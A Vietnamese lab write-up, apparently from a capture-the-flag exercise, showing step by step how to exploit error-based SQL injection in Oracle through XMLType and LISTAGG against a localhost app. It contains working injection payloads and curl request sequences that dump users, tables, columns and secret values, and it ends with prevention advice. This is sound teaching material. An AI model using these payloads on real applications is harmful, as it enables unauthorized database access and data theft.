# SQLi-016: Oracle XMLType Error-based - Complete Writeup

## 📋 Tóm Tắt

Bài lab này yêu cầu khai thác SQL Injection trên Oracle Database sử dụng kỹ thuật **Error-based** với hàm `XMLType` để trích xuất dữ liệu từ bảng `secrets`.

**Độ khó:** Medium  
**Kỹ thuật:** Oracle Error-based SQL Injection với XMLType  
**Mục tiêu:** Trích xuất flag từ bảng `secrets`

---

## 🔍 Bước 1: Reconnaissance & Detection

### 1.1 Khám phá ứng dụng

Truy cập URL: `http://localhost:5016/export?id=1`

```http
GET /export?id=1 HTTP/1.1
Host: localhost:5016
```

**Response:** Hiển thị export data với nội dung bình thường.

### 1.2 Phát hiện SQL Injection

Thử các payload phát hiện cơ bản:

```bash
# Test 1: Single quote
curl "http://localhost:5016/export?id=1'"
# ❌ Lỗi: ORA-01756: quoted string not properly terminated

# Test 2: Comment
curl "http://localhost:5016/export?id=1--"
# ✅ Hoạt động bình thường

# Test 3: Boolean logic
curl "http://localhost:5016/export?id=1 AND 1=1--"
# ✅ Hiển thị export 1

curl "http://localhost:5016/export?id=1 AND 1=2--"
# ❌ Không có kết quả
```

**Kết luận:** Ứng dụng có lỗ hổng SQL Injection!

### 1.3 Xác định Database Management System

Từ error message `ORA-01756`, ta biết đây là **Oracle Database**.

```bash
# Confirm bằng Oracle-specific syntax
curl "http://localhost:5016/export?id=1 AND 1=1 FROM dual--"
# ✅ Hoạt động (dual là bảng đặc biệt của Oracle)
```

---

## 🎯 Bước 2: Tìm Error-based Technique

### 2.1 Vấn đề với error thông thường

Thử truy vấn subquery:

```sql
1 AND 1=(SELECT user FROM dual)--
```

**Error:** `ORA-01722: invalid number`

**Vấn đề:** Oracle chỉ báo lỗi kiểu dữ liệu, **không hiển thị nội dung** của subquery trong error message.

### 2.2 Tại sao dùng XMLType?

**XMLType** là một error-based function **luôn có sẵn** trên mọi Oracle version (kể cả XE), không cần Oracle Text như CTXSYS.DRITHSX.SN.

**Ưu điểm:**

- ✅ Có sẵn trên **mọi Oracle installation**
- ✅ Không yêu cầu component bổ sung
- ✅ Output rõ ràng, hiển thị đầy đủ data
- ✅ Cú pháp đơn giản

---

## 💡 Bước 3: XMLType - Vũ khí Error-based

### 3.1 XMLType hoạt động như thế nào?

**Giải thích kỹ thuật:**

```sql
XMLType(xml_string)
```

1. **Mục đích:** Constructor để tạo một XML document từ string
2. **Tham số:** Phải là một valid XML string
3. **Khai thác:** Truyền vào một non-XML string

**Điểm khai thác:**

Khi ta truyền subquery trả về non-XML string:

```sql
XMLType((SELECT 'APP_USER' FROM dual))
```

Oracle sẽ:

1. Thực thi subquery → Kết quả: `'APP_USER'`
2. Cố gắng parse `'APP_USER'` như XML
3. **Thất bại** vì không phải XML format
4. Exception message **chứa giá trị gốc**: `"APP_USER"`

**Error message điển hình:**

```
ORA-19202: Error occurred in XML processing
LPX-00210: expected '<' instead of 'A'
Error at line 1
APP_USER
```

→ Data bị **leak qua error message**! 🎯

### 3.2 Payload đúng

**❌ Payload sai (phức tạp và không hoạt động):**

```sql
-- Cố tạo XML tag với dữ liệu bên trong
XMLTYPE('<:'||(SELECT user FROM dual)||'>')
-- Error: LPX-00240 (XML tag không hợp lệ, data bị mất)
```

**✅ Payload đúng (đơn giản và hiệu quả):**

```sql
-- Truyền trực tiếp non-XML string vào XMLType
1 AND 1=XMLType((SELECT user FROM dual))--
```

**Tại sao payload đơn giản lại tốt hơn?**

- `<:APP_USER>` không phải XML tag hợp lệ (XML tag phải bắt đầu bằng chữ cái)
- Error bị che bởi LPX-00240 (message file not found)
- Non-XML string đơn giản tạo error rõ ràng hơn

---

## 🚀 Bước 4: Enumeration - Khám phá Database

### 4.1 Lấy thông tin user hiện tại

**Payload:**

```sql
1 AND 1=XMLType((SELECT user FROM dual))--
```

**Request:**

```bash
curl "http://localhost:5016/export?id=1+AND+1=XMLType((SELECT+user+FROM+dual))--"
```

**Response:**

```
ORA-19202: Error occurred in XML processing
LPX-00210: expected '<' instead of 'A'
Error at line 1
APP_USER
```

→ Current user: `APP_USER` ✅

### 4.2 Liệt kê tất cả các bảng (tables)

**Vấn đề:** Query thông thường `SELECT table_name FROM user_tables` trả về **nhiều dòng**.

**Giải pháp:** Dùng `LISTAGG` để **concatenate tất cả kết quả** thành 1 string!

**Payload:**

```sql
1 AND 1=XMLType((SELECT LISTAGG(table_name, ',') WITHIN GROUP (ORDER BY table_name) FROM user_tables))--
```

**Request:**

```bash
curl "http://localhost:5016/export?id=1+AND+1=XMLType((SELECT+LISTAGG(table_name,',')+WITHIN+GROUP+(ORDER+BY+table_name)+FROM+user_tables))--"
```

**Response:**

```
ORA-19202: Error occurred in XML processing
LPX-00210: expected '<' instead of 'E'
Error at line 1
EXPORTS,SECRETS
```

→ Phát hiện 2 bảng: `EXPORTS`, `SECRETS` ✅

### 4.3 Liệt kê các cột của bảng SECRETS

**Payload:**

```sql
1 AND 1=XMLType((SELECT LISTAGG(column_name, ',') WITHIN GROUP (ORDER BY column_name) FROM all_tab_columns WHERE table_name='SECRETS'))--
```

**Request:**

```bash
curl "http://localhost:5016/export?id=1+AND+1=XMLType((SELECT+LISTAGG(column_name,',')+WITHIN+GROUP+(ORDER+BY+column_name)+FROM+all_tab_columns+WHERE+table_name='SECRETS'))--"
```

**Response:**

```
ORA-19202: Error occurred in XML processing
LPX-00210: expected '<' instead of 'I'
Error at line 1
ID,NAME,VALUE
```

→ Bảng SECRETS có 3 cột: `ID`, `NAME`, `VALUE` ✅

**Cấu trúc bảng SECRETS:**

```
SECRETS
├── ID      (NUMBER)
├── NAME    (VARCHAR2)
└── VALUE   (VARCHAR2) ← Flag ở đây!
```

---

## 🏆 Bước 5: Exploitation - Lấy Flag

### 5.1 Trích xuất FLAG từ cột VALUE

**Payload:**

```sql
1 AND 1=XMLType((SELECT VALUE FROM SECRETS))--
```

**Request:**

```bash
curl "http://localhost:5016/export?id=1+AND+1=XMLType((SELECT+VALUE+FROM+SECRETS))--"
```

**Response:**

```
ORA-19202: Error occurred in XML processing
LPX-00210: expected '<' instead of 'F'
Error at line 1
FLAG{xmltyp3_0r4cl3_3xtr4ct}
```

🎉 **FLAG FOUND:** `FLAG{xmltyp3_0r4cl3_3xtr4ct}`

---

## 📝 Summary of Exploitation Chain

```
1. Detect SQLi          → ' AND 1=1-- works
2. Identify Oracle      → ORA-xxxxx errors
3. Find error-based     → XMLType (always available)
4. Enumerate user       → APP_USER
5. List tables          → EXPORTS, SECRETS (using LISTAGG)
6. List columns         → ID, NAME, VALUE (using LISTAGG)
7. Extract flag         → FLAG{xmltyp3_0r4cl3_3xtr4ct}
```

**Complete payload sequence:**

```bash
# Step 1: Enumerate current user
curl "http://localhost:5016/export?id=1+AND+1=XMLType((SELECT+user+FROM+dual))--"
# Expected: APP_USER in error message

# Step 2: List all tables
curl "http://localhost:5016/export?id=1+AND+1=XMLType((SELECT+LISTAGG(table_name,',')+WITHIN+GROUP+(ORDER+BY+table_name)+FROM+user_tables))--"
# Expected: EXPORTS,SECRETS in error message

# Step 3: List columns in SECRETS table
curl "http://localhost:5016/export?id=1+AND+1=XMLType((SELECT+LISTAGG(column_name,',')+WITHIN+GROUP+(ORDER+BY+column_name)+FROM+all_tab_columns+WHERE+table_name='SECRETS'))--"
# Expected: ID,NAME,VALUE in error message

# Step 4: Extract flag
curl "http://localhost:5016/export?id=1+AND+1=XMLType((SELECT+VALUE+FROM+SECRETS))--"
# Expected: FLAG{xmltyp3_0r4cl3_3xtr4ct} in error message
```

**Hoặc trong browser:**

```
http://localhost:5016/export?id=1 AND 1=XMLType((SELECT user FROM dual))--
http://localhost:5016/export?id=1 AND 1=XMLType((SELECT LISTAGG(table_name, ',') WITHIN GROUP (ORDER BY table_name) FROM user_tables))--
http://localhost:5016/export?id=1 AND 1=XMLType((SELECT LISTAGG(column_name, ',') WITHIN GROUP (ORDER BY column_name) FROM all_tab_columns WHERE table_name='SECRETS'))--
http://localhost:5016/export?id=1 AND 1=XMLType((SELECT VALUE FROM SECRETS))--
```

**💡 Lưu ý:** Để automation, xem [exploit.py](exploit.py) script.

---

## 🎓 Bài Học Quan Trọng

### 1. XMLType vs CTXSYS.DRITHSX.SN

| Tiêu chí           | XMLType                | CTXSYS.DRITHSX.SN      |
| ------------------ | ---------------------- | ---------------------- |
| **Availability**   | ⭐⭐⭐⭐⭐ Luôn có     | ⭐⭐⭐ Cần Oracle Text |
| **Output Quality** | ⭐⭐⭐⭐ Đầy đủ        | ⭐⭐⭐⭐⭐ Rất đầy đủ  |
| **Ease of Use**    | ⭐⭐⭐⭐⭐ Rất dễ      | ⭐⭐⭐⭐⭐ Rất dễ      |
| **Compatibility**  | ⭐⭐⭐⭐⭐ 100% Oracle | ⭐⭐⭐ Cần Oracle Text |

**Kết luận:**

- **XMLType** = Best for **compatibility** (works everywhere)
- **CTXSYS** = Best for **output quality** (cleaner error messages)

### 2. Kỹ thuật LISTAGG quan trọng

**Vấn đề:** Subquery trả về nhiều dòng → `ORA-01427: single-row subquery returns more than one row`

**Giải pháp:** Dùng `LISTAGG` để concatenate:

```sql
LISTAGG(column_name, delimiter) WITHIN GROUP (ORDER BY sort_column)
```

**Ví dụ:**

```sql
-- ❌ Lỗi: Multiple rows
SELECT table_name FROM user_tables

-- ✅ Đúng: Single concatenated string
SELECT LISTAGG(table_name, ',') WITHIN GROUP (ORDER BY table_name) FROM user_tables
-- Output: "EXPORTS,SECRETS"
```

### 3. XMLType Payload Best Practices

**❌ Tránh payload phức tạp:**

```sql
-- Cố tạo XML tag - phức tạp và dễ lỗi
XMLTYPE('<:'||(SELECT user FROM dual)||'>')
XMLTYPE('<?xml...'||(SELECT user FROM dual)||'...')
```

**✅ Dùng payload đơn giản:**

```sql
-- Trực tiếp non-XML string
1 AND 1=XMLType((SELECT user FROM dual))--
```

**Lý do:**

- Đơn giản hơn, ít lỗi syntax
- Error message rõ ràng hơn
- Không bị che bởi XML parsing errors

### 4. Oracle Error-based Methods Comparison

| Method             | When to Use                     | Pros             | Cons              |
| ------------------ | ------------------------------- | ---------------- | ----------------- |
| **XMLType**        | Oracle XE, không có Oracle Text | Luôn có sẵn      | Output nhiều dòng |
| **CTXSYS.DRITHSX** | Oracle Standard/Enterprise      | Output sạch nhất | Cần Oracle Text   |
| **UTL_INADDR**     | Có network privileges           | Alternative tốt  | Cần quyền cao     |
| **EXTRACTVALUE**   | XML-based queries               | Flexibility      | Phức tạp hơn      |

---

## 🛡️ Cách Phòng Chống

### 1. Sử dụng Prepared Statements

**❌ Vulnerable Code:**

```python
# Bad - String concatenation
query = f"SELECT * FROM exports WHERE id = {user_input}"
cur.execute(query)
```

**✅ Secure Code:**

```python
# Good - Parameterized query
query = "SELECT * FROM exports WHERE id = :id"
cur.execute(query, {"id": user_input})
```

### 2. Input Validation

```python
# Validate that ID is numeric
if not user_input.isdigit():
    return "Invalid input", 400
```

### 3. Least Privilege

```sql
-- App user should NOT have access to SECRETS table
REVOKE SELECT ON secrets FROM app_user;
```

### 4. Disable Error Messages in Production

```python
# Don't show detailed Oracle errors to users
try:
    cur.execute(query)
except Exception as e:
    logger.error(f"Database error: {e}")
    return "An error occurred", 500  # Generic message
```

### 5. Disable XMLType if not needed

```sql
-- Revoke XMLType if application doesn't use it
REVOKE EXECUTE ON XMLTYPE FROM PUBLIC;
```

---

## 📚 References

- [Oracle XMLType Documentation](https://docs.oracle.com/en/database/oracle/oracle-database/19/adxdb/XMLType-APIs.html)
- [Oracle SQL Injection Cheat Sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet)
- [OWASP SQL Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [PayloadsAllTheThings - Oracle SQLi](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/Oracle%20Injection.md)

---

## ✅ Flag

```
FLAG{xmltyp3_0r4cl3_3xtr4ct}
```

**Ý nghĩa flag:**

- `xmltyp3` → XMLType (viết leet: XMLType → xmltyp3)
- `0r4cl3` → Oracle (viết leet: Oracle → 0r4cl3)
- `3xtr4ct` → Extract (viết leet: extract → 3xtr4ct)

---

**🎯 Completed:** SQLi-016 - Oracle XMLType Error-based Exploitation
